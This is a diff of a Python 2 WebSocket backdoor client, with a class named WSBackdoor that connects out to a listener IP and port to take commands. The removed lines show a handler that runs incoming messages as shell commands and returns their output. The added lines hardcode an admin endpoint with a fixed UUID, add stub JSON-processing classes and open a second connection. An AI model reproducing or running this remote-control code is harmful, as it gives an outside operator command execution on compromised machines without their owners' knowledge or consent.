@@ -8,6 +8,9 @@ from clint.packages.colorama.win32 import STDERR
 
 __author__ = "f47h3r - Chase Schultz"
 
+UUID = '6faf6300-7318-11e1-b0c4-0800200c9a66'
+users = []
+
 class WSBackdoor(WebSocketClient):
     
     def __execute__(self, cmd, args=None):
@@ -59,21 +62,17 @@ class AdminWebsocket(WebSocketClient):
     def closed(self, code, reason):
         print "Closed down", code, reason
 
-    def received_message(self, cmd):
-        self.cwd = os.getcwd()
-        print "Received Message: %s Length: %d" % (str(cmd), len(cmd))
-        cmd = str(cmd)
-        command = cmd.split()
-        if command[0] == 'cd':
-            self.changeDir(command[1])
-        else:
-            print command
-            response = self.__execute__(command)
-            self.send(response)
+    def received_message(self, jsonObject):
+        print 'RECEIVED ON ADMIN INTERFACE:\n\n %s' % str(jsonObject)
+        
 
+class jsonObjectProccessor():
     
+    def spawnHandler(self):
+        pass
 
-
+    def decodeObject(self, object):
+        pass
 
 if __name__ == '__main__':
     usage = __doc__
@@ -92,6 +91,8 @@ if __name__ == '__main__':
                       help='Listener IP address')
     (options, args) = parser.parse_args()
     try:
+        adminWebsocket = AdminWebsocket('http://'+options.ip+':'+options.port+'/endpoint/admin/6faf6300-7318-11e1-b0c4-0800200c9a66/', protocols=['http-only', 'chat'])
+        adminWebsocket.connect()
         ws = WSBackdoor('http://'+options.ip+':'+options.port+'/endpoint/boxes/box1', protocols=['http-only', 'chat'])
         ws.connect()
     except KeyboardInterrupt:
